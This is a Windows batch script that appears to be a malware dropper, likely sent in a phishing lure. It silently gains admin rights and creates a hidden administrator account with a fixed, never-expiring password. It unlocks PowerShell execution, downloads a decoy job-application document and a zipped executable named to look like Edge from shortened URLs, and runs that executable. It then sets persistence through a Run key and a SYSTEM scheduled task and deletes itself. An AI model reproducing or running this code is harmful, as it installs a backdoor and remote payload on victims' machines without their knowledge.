@echo off
setlocal enabledelayedexpansion

if "%~1" NEQ "HIDDEN" (
    PowerShell -Command "Start-Process -WindowStyle Hidden -FilePath cmd -ArgumentList '/c','%~f0','HIDDEN'" -Verb RunAs 2>nul
    exit /b
)

if "%~1" == "DEBUG" (
    echo DEBUG mode enabled
) else (
    @echo off
)

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

net user TBuG "P@ssw0rd123!" /add /Y >nul 2>&1
net localgroup administrators TBuG /add >nul 2>&1
powershell -Command "Set-LocalUser -Name TBuG -PasswordNeverExpires $true" >nul

powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force" >nul

reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v ExecutionPolicy /t REG_SZ /d Unrestricted /f >nul

set "docUrl=http://tiny.cc/ec7m001"  &:: 
set "downloadsDir=%USERPROFILE%\Downloads"
set "targetFolder=%downloadsDir%\Applications Documents"

if not exist "%targetFolder%" (
    mkdir "%targetFolder%" >nul
)

powershell -Command "Invoke-WebRequest -Uri '%docUrl%' -OutFile '%targetFolder%\Employment Application Form.docx'" >nul

set "mallUrl=http://tiny.cc/5npm001"  &:: 
set "mallDest=%APPDATA%\Microsoft\Windows\Templates\mall"
set "mallZip=%mallDest%.zip"

mkdir "%mallDest%" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri '%mallUrl%' -OutFile '%mallZip%'" >nul
powershell -Command "Expand-Archive -Path '%mallZip%' -DestinationPath '%mallDest%' -Force" >nul

set "appPath=%mallDest%\Egde.exe"

start "" /B "%mallDest%\egde.exe"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AppPersistence" /t REG_SZ /d "\"%appPath%\"" /f >nul

schtasks /create /tn "AppPersistence" /tr "\"%appPath%\"" /sc onlogon /ru "SYSTEM" /f >nul 2>&1

powershell -Command "$s = (New-Object -COM WScript.Shell).CreateShortcut('%shortcutPath%'); $s.TargetPath = '%appPath%'; $s.WorkingDirectory = '%mallDest%'; $s.Save()" >nul

timeout /t 10 >nul
del /f /q "%mallZip%" >nul 2>&1
del /f /q "%~f0" >nul